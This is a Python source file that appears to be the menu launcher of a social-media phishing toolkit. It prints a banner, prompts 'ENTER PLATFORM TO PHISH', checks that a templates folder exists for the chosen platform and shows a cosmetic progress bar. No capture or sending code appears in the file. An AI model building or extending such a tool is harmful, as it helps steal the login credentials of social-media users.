import os
import sys
from Asessts.assets import banner, SocialMediaMenu, colors, io
import time
import random


print(banner.banner)

socialmedia = SocialMediaMenu()
socialmedia.display_menu()
isAvailable = [1]


def userChoice_funct():
    userChoice = input(f"{colors.blue}\nENTER PLATFORM TO PHISH:{colors.green} ")
    try:
        newuserChoice = int(userChoice)
        if newuserChoice not in isAvailable:
            io.output(info="The Service is not available Yet.", color=colors.red)
            io.output(info="Available Services "+str(isAvailable), color=colors.blue)
            userChoice_funct()
        else:
            platform = socialmedia.platforms.get(newuserChoice)
            io.output(info=f"preparing {platform} scripts........", color=colors.green)
            progress = ""
            isExists=checkScripts(platform=platform.lower())
            # print(isExists)
            randPercentage = random.randint(1, 100)
            sleepTM=0.2
            for i in range(100):
                time.sleep(sleepTM)
                progress += "="
                print(f"{progress} {i}% \r", end=' ', flush=True)
                if i==randPercentage:
                    if isExists:
                        sleepTM=0.01
                        pass
                    else:
                        io.output(info=f"[!] Error finding {platform} script",color=colors.red)
                        sys.exit(1)
                if i == 99:
                    print(f"{progress} {i}% done!!")
                    
                    return True
    except Exception as e:
        print(e)
        sys.exit(0)

def checkScripts(platform):
    path=f"./templates/{platform}"
    return os.path.isdir(path)

userChoice_funct()





